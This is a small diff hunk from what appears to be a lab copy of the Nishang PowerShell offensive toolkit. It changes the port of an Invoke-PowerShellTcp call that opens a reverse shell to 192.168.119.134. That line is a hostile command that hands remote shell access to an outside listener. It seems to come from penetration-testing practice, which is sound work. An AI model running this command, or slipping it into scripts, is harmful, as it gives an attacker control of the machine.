@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.134 -Port 4444
+Invoke-PowerShellTcp -Reverse -IPAddress 192.168.119.134 -Port 6666
